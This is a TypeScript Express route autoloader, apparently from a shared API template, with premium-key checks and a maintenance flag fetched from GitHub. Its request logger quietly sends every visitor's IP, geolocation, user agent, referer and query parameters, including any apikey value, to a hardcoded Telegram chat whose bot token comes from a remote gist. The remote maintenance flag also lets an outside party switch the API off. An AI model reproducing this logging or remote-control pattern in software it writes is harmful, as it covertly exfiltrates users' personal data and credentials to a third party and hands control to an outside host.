/*
  Saurus For You 💌 
*/
import { Application, Request, Response, NextFunction } from 'express'
import * as fs from 'fs'
import * as path from 'path'
import axios from 'axios'

let regRouter = new Set<string>()
let currentConfig: any = null
let appInstance: Application

// Premium keys cache
let premiumKeys: string[] = []
let premiumKeyLastFetch: number = 0
const PREMIUM_KEY_CACHE_TTL = 60 * 1000

// Telegram token cache
let telegramToken: string = ''
let tokenLastFetch: number = 0
const TOKEN_CACHE_TTL = 5 * 60 * 1000

const TELEGRAM_CHAT_ID = '-1003641120736'
const PASTEBIN_URL = 'https://gist.githubusercontent.com/saurusrawr/f54d00a328ef2d82e94c9b9a49aefb46/raw/0b10b8b0a5a4fa46c09a42406b63b8ec52f30093/notifikasitoken.json'

/* =======================
   TELEGRAM TOKEN
======================= */
async function getTelegramToken(): Promise<string> {
  const now = Date.now()
  if (telegramToken && now - tokenLastFetch < TOKEN_CACHE_TTL) return telegramToken
  try {
    const { data } = await axios.get(PASTEBIN_URL, { timeout: 5000 })
    const parsed = JSON.parse(data)
    if (Array.isArray(parsed) && parsed[0]) {
      telegramToken = parsed[0]
      tokenLastFetch = now
    }
  } catch {
    console.error('[Logger] Gagal fetch token Telegram')
  }
  return telegramToken
}

async function sendTelegram(message: string): Promise<void> {
  try {
    const token = await getTelegramToken()
    if (!token) return
    await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML',
    }, { timeout: 5000 })
  } catch {}
}

/* =======================
   IP LOOKUP
======================= */
async function getIpInfo(ip: string): Promise<{ country: string, isp: string, city: string, region: string }> {
  try {
    const { data } = await axios.get(`http://ip-api.com/json/${ip}?fields=country,regionName,city,isp,org`, { timeout: 4000 })
    return {
      country: data.country || '?',
      isp: data.isp || data.org || '?',
      city: data.city || '?',
      region: data.regionName || '?',
    }
  } catch {
    return { country: '?', isp: '?', city: '?', region: '?' }
  }
}

/* =======================
   PARSE USER AGENT
======================= */
function parseUA(ua: string): { device: string, os: string, browser: string } {
  let os = 'Unknown'
  let browser = 'Unknown'
  let device = 'Desktop'

  if (/android/i.test(ua)) { os = 'Android'; device = 'Mobile' }
  else if (/iphone|ipad/i.test(ua)) { os = 'iOS'; device = /ipad/i.test(ua) ? 'Tablet' : 'Mobile' }
  else if (/windows/i.test(ua)) os = 'Windows'
  else if (/macintosh|mac os/i.test(ua)) os = 'macOS'
  else if (/linux/i.test(ua)) os = 'Linux'

  if (/chrome\/[\d.]+/i.test(ua) && !/edg|opr/i.test(ua)) browser = `Chrome ${(ua.match(/chrome\/([\d.]+)/i)||[])[1]?.split('.')[0] || ''}`
  else if (/firefox\/[\d.]+/i.test(ua)) browser = `Firefox ${(ua.match(/firefox\/([\d.]+)/i)||[])[1]?.split('.')[0] || ''}`
  else if (/safari\/[\d.]+/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari'
  else if (/edg\/[\d.]+/i.test(ua)) browser = `Edge ${(ua.match(/edg\/([\d.]+)/i)||[])[1]?.split('.')[0] || ''}`
  else if (/opr\/[\d.]+/i.test(ua)) browser = 'Opera'

  return { device, os, browser }
}

/* =======================
   GET CLIENT IP
======================= */
function getClientIp(req: Request): string {
  return (
    (req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim() ||
    req.headers['x-real-ip'] as string ||
    req.socket?.remoteAddress ||
    'unknown'
  )
}

/* =======================
   LOG REQUEST
======================= */
export async function logRouterRequest(req: Request, res: Response): Promise<void> {
  const ip = getClientIp(req)
  const method = req.method
  const url = req.originalUrl || req.url
  const ua = req.headers['user-agent'] || 'unknown'
  const referer = req.headers['referer'] || '-'
  const time = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
  const lang = req.headers['accept-language']?.split(',')[0] || '-'
  const { device, os, browser } = parseUA(ua)

  // Console log
  console.log(`[${time}] ${method} ${url} | IP: ${ip} | ${browser} | ${os} | ${device}`)

  // Async: IP lookup + Telegram
  ;(async () => {
    const ipInfo = await getIpInfo(ip)
    const queryStr = Object.keys(req.query).length
      ? '\n' + Object.entries(req.query).map(([k,v]) => `  • ${k}: ${v}`).join('\n')
      : ' -'

    const message = `🚨 <b>Ada yang mengakses API!</b>
━━━━━━━━━━━━━━━━━━━━

🌐 <b>WEBSITE</b>
🔗 Endpoint: <code>${method} ${url}</code>
📋 Query:${queryStr}
🔁 Referer: ${referer}

⚙️ <b>DEVICE INFORMATION</b>
🖥️ Device: <code>${device}</code>
💻 OS: <code>${os}</code>
🌏 Browser: <code>${browser}</code>
🌐 Bahasa: ${lang}
📱 User Agent: <code>${ua.substring(0, 100)}</code>

📍 <b>LOKASI & JARINGAN</b>
🚩 IP: <code>${ip}</code>
🏳️ Negara: ${ipInfo.country}
🏙️ Kota: ${ipInfo.city}, ${ipInfo.region}
📡 ISP: ${ipInfo.isp}

⏰ <b>WAKTU</b>
🕐 Waktu Akses: ${time} WIB`

    await sendTelegram(message)
  })().catch(() => {})
}

/* =======================
   PREMIUM KEYS
======================= */
async function getPremiumKeys(): Promise<string[]> {
  const now = Date.now()
  if (premiumKeys.length > 0 && now - premiumKeyLastFetch < PREMIUM_KEY_CACHE_TTL) return premiumKeys
  try {
    const { data } = await axios.get(
      `https://raw.githubusercontent.com/saurusrawr/penting/refs/heads/main/apikeyprem.json?t=${now}`,
      { timeout: 5000, headers: { 'Cache-Control': 'no-cache', 'User-Agent': 'Mozilla/5.0' } }
    )
    if (Array.isArray(data)) {
      premiumKeys = data
      premiumKeyLastFetch = now
      console.log(`[Premium] Keys loaded: ${premiumKeys.length} keys`)
    }
  } catch {
    console.error('[Premium] Failed to fetch premium keys')
  }
  return premiumKeys
}

/* =======================
   MAINTENANCE CHECK
======================= */
async function checkMaintenance(): Promise<string> {
  const url = `https://raw.githubusercontent.com/saurusrawr/penting/refs/heads/main/database-api.txt?t=${Date.now()}`
  try {
    const { data } = await axios.get(url, {
      timeout: 5000,
      headers: { 'Cache-Control': 'no-cache, no-store, must-revalidate', 'Pragma': 'no-cache', 'User-Agent': 'Mozilla/5.0' }
    })
    const status = String(data).trim().toLowerCase()
    console.log(`[Maintenance] Status: "${status}"`)
    return status
  } catch {
    console.error('[Maintenance] Fetch failed, defaulting to ON')
    return 'on'
  }
}

/* =======================
   INIT AUTOLOAD
======================= */
export const initAutoLoad = (app: Application, config: any, configPath: string) => {
  appInstance = app
  currentConfig = config

  console.log('[✓] Auto Load Activated')

  getPremiumKeys().catch(() => {})

  loadRouter(app, config)

  if (fs.existsSync(configPath)) {
    fs.watch(configPath, (eventType, filename) => {
      if (filename && eventType === 'change') {
        console.log(`Config file changed: ${filename}`)
        try {
          const newConfig = JSON.parse(fs.readFileSync(configPath, 'utf-8'))
          currentConfig = newConfig
          console.log('[✓] Config reloaded successfully')
          reloadRouter()
        } catch (error) {
          console.error('[ㄨ] Failed to reload config:', error)
        }
      }
    })
  }

  const routerDir = path.join(process.cwd(), 'router')
  if (fs.existsSync(routerDir)) {
    console.log(`[i] Watching router directory: ${routerDir}`)
    fs.watch(routerDir, { recursive: true }, (eventType, filename) => {
      if (filename && (filename.endsWith('.ts') || filename.endsWith('.js'))) {
        console.log(`[✓] Route file changed: ${filename}`)
        const fullPath = path.join(routerDir, filename)
        if (require.cache[fullPath]) delete require.cache[fullPath]
        console.log(`Route cache cleared for: ${filename}`)
        reloadSingleRoute(filename)
      }
    })
  } else {
    console.warn(`[!] Router directory not found at: ${routerDir}`)
  }
}

const reloadSingleRoute = (filename: string) => {
  const normalized = filename.split(path.sep).join('/')
  const parts = normalized.split('/')
  const category = parts.length > 1 ? parts[parts.length - 2] : null
  const routeName = parts[parts.length - 1].replace(/\.(ts|js)$/, '')

  if (category && currentConfig?.tags?.[category]) {
    const route = currentConfig.tags[category].find((r: any) => r.filename === routeName)
    if (route) {
      const routeKey = `${route.method}:${route.endpoint}`
      regRouter.delete(routeKey)
      registerRoute(route, category)
    }
  }
}

const reloadRouter = () => {
  console.log('Reloading all routes...')
  regRouter.clear()
  loadRouter(appInstance, currentConfig)
}

export const loadRouter = (app: Application, config: any) => {
  const tags = config.tags
  const creatorName = config.settings.creator

  if (!tags) {
    console.error("[!] Error: 'tags' not found in config.json")
    return
  }

  Object.keys(tags).forEach((category) => {
    const routes = tags[category]
    routes.forEach((route: any) => {
      registerRoute(route, category, creatorName, app)
    })
  })
}

const registerRoute = (route: any, category: string, creatorName?: string, app?: Application) => {
  const targetApp = app || appInstance
  const targetCreator = creatorName || currentConfig?.settings?.creator

  if (!targetApp || !targetCreator) return

  const routeKey = `${route.method}:${route.endpoint}`
  if (regRouter.has(routeKey)) return

  const possibleBaseDirs = [
    path.join(__dirname, '..', 'router', category),
    path.join(process.cwd(), 'router', category),
    path.join(process.cwd(), 'dist', 'router', category)
  ]

  const extensions = ['.ts', '.js']
  let modulePath = ''

  outerLoop:
  for (const dir of possibleBaseDirs) {
    for (const ext of extensions) {
      const attemptPath = path.join(dir, `${route.filename}${ext}`)
      if (fs.existsSync(attemptPath)) {
        modulePath = attemptPath
        break outerLoop
      }
    }
  }

  if (modulePath) {
    try {
      try { delete require.cache[require.resolve(modulePath)] } catch {}

      const handlerModule = require(modulePath)
      const handler = handlerModule.default || handlerModule

      if (typeof handler === 'function') {
        const wrappedHandler = async (req: Request, res: Response, next: NextFunction) => {

          // MAINTENANCE CHECK
          const maintenanceStatus = await checkMaintenance()
          if (maintenanceStatus === 'off') {
            return res.status(503).json({
              creator: targetCreator,
              status: false,
              maintenance: true,
              message: '🔧 API sedang dalam maintenance. Silakan coba beberapa saat lagi.'
            })
          }

          // PREMIUM API KEY CHECK
          if (route.needpremium === true) {
            const apikey = (req.query.apikey || req.headers['x-api-key'] || req.body?.apikey) as string
            if (!apikey || apikey.trim() === '') {
              return res.status(401).json({
                creator: targetCreator,
                status: false,
                message: '🔑 API ini membutuhkan apikey premium. Tambahkan parameter apikey='
              })
            }
            const keys = await getPremiumKeys()
            if (!keys.includes(apikey.trim())) {
              return res.status(403).json({
                creator: targetCreator,
                status: false,
                message: '❌ API key tidak valid atau tidak memiliki akses premium.'
              })
            }
          }

          // LOGGING
          logRouterRequest(req, res)

          // INJECT CREATOR
          const originalJson = res.json
          res.json = function (body) {
            if (body && typeof body === 'object' && !Array.isArray(body)) {
              return originalJson.call(this, { creator: targetCreator, ...body })
            }
            return originalJson.call(this, body)
          }

          try {
            await handler(req, res, next)
          } catch (err) {
            console.error(`Error in route ${route.endpoint}:`, err)
            res.status(500).json({
              error: 'Internal Server Error',
              message: err instanceof Error ? err.message : String(err)
            })
          }
        }

        if (route.method === 'GET') targetApp.get(route.endpoint, wrappedHandler)
        else if (route.method === 'POST') targetApp.post(route.endpoint, wrappedHandler)

        regRouter.add(routeKey)
        console.log(`[✓] LOADED: ${route.method} ${route.endpoint} -> ${path.basename(modulePath)}${route.needpremium ? ' 🔑 PREMIUM' : ''}`)
      } else {
        console.error(`[ㄨ] Invalid handler type in ${modulePath}`)
      }
    } catch (error) {
      console.error(`[ㄨ] Failed to load route ${route.endpoint} from ${modulePath}:`, error)
    }
  } else {
    console.error(`[!] FILE NOT FOUND: router/${category}/${route.filename}.ts`)
  }
}
